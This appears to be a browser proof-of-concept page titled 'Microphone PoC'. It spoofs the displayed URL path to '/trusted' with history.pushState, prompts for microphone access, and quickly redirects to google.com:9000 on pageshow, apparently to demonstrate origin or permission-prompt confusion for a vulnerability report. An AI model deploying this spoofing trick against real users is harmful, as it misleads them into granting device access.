<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Microphone PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#f5f5f7;
}

button {
  margin:6px;
  font-size:14px;
  padding:8px 12px;
}

#panel {
  display:none;
  max-width:520px;
  margin:60px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.2);
}

h2 { text-align:center; margin-bottom:6px; }
.sub { text-align:center; color:#666; margin-bottom:20px; }

.notice {
  margin-top:14px;
  font-size:13px;
  color:#b00020;
}

#microphoneStatus {
  margin-top: 20px;
  font-size: 16px;
  color: #333;
}
</style>
</head>

<body>

<div style="text-align:center">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Access Microphone</h2>

  <button id="microphoneButton" onclick="openMicrophone()">Access Microphone</button>
  
  <div id="microphoneStatus">Microphone Status: -</div>

  <div class="notice">
    Demo only — browser permission required
  </div>
</div>

<script>
const panel = document.getElementById('panel');
const trigger = document.getElementById('trigger');
const microphoneStatus = document.getElementById('microphoneStatus');

// Fungsi untuk membuka akses mikrofon
function openMicrophone() {
  checkMicrophonePermission()
    .then(hasPermission => {
      if (hasPermission) {
        navigator.mediaDevices.getUserMedia({ audio:true })
          .then(stream => {
            microphoneStatus.textContent = "Microphone Access: Granted";
            console.log("Microphone Access Granted", stream);
          })
          .catch(() => {
            microphoneStatus.textContent = "Microphone Access: Denied";
            alert('Microphone denied');
          });
      } else {
        microphoneStatus.textContent = "Microphone Access: Denied by User";
        alert('Microphone permission denied by user');
      }
    });
}

// Cek izin mikrofon dengan navigator.permissions
function checkMicrophonePermission() {
  return navigator.permissions.query({ name: 'microphone' })
    .then(permissionStatus => {
      return permissionStatus.state === 'granted';
    })
    .catch(() => {
      return false; // Jika tidak dapat mengecek izin, anggap ditolak
    });
}

trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

// Mengarah ke Google setelah beberapa detik
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9000'; // Redirect ke Google
      }, 80); // 2 detik setelah klik tombol
    });
  });
});
</script>

</body>
</html>
